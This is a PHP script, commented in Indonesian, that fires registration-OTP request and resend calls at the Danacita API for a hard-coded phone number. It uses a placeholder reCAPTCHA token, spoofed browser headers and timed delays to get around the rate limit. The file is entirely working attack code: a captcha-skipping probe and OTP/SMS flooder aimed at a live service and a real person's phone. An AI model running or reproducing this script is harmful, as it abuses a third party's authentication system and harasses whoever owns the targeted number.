<?php
// Konfirmasi final Danacita: request OTP bersih setelah masa limit lewat.
$L = '083822461998';
$TOKEN = str_repeat('a', 120);

function post($u, $b) {
  $ch = curl_init($u);
  curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_POST => true, CURLOPT_POSTFIELDS => $b,
    CURLOPT_CONNECTTIMEOUT => 10, CURLOPT_TIMEOUT => 30, CURLOPT_ENCODING => '',
    CURLOPT_HTTPHEADER => ['Content-Type: application/json', 'Accept: application/json, text/plain, */*',
      'Origin: https://app.danacita.co.id', 'Referer: https://app.danacita.co.id/',
      'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36']]);
  $r = (string) curl_exec($ch); $c = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
  curl_close($ch);
  return [$c, trim(preg_replace('/\s+/', ' ', $r))];
}

$cases = [
  'request-wa'  => ['https://api.danacita.co.id/api/atlas/v1/auth/registration-otp-request',
    json_encode(['username' => $L, 'recaptcha' => $TOKEN, 'notif_channel_mode' => 'wa', 'is_white_label' => false])],
  'request-sms' => ['https://api.danacita.co.id/api/atlas/v1/auth/registration-otp-request',
    json_encode(['username' => $L, 'recaptcha' => $TOKEN, 'notif_channel_mode' => 'sms', 'is_white_label' => false])],
  'resend'      => ['https://api.danacita.co.id/api/atlas/v1/auth/registration-otp-resend',
    json_encode(['username' => $L, 'notif_channel_mode' => 'wa'])],
];
$i = 0;
foreach ($cases as $n => [$u, $b]) {
  if ($i++ > 0) sleep(20);
  [$c, $r] = post($u, $b);
  printf("%-12s [%d] %s\n", $n, $c, $r !== '' ? substr($r, 0, 220) : '(kosong)');
}
echo "\n";
